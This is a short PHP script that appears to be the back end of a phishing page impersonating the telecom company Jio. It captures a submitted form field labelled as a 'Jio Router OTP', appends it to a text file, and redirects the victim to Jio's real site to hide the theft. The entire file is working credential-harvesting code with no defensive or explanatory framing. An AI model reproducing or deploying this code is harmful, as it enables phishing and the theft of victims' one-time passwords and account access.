<?php
file_put_contents("otp.txt", "Jio Router OTP : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: https://www.jio.com/welcome');
?>
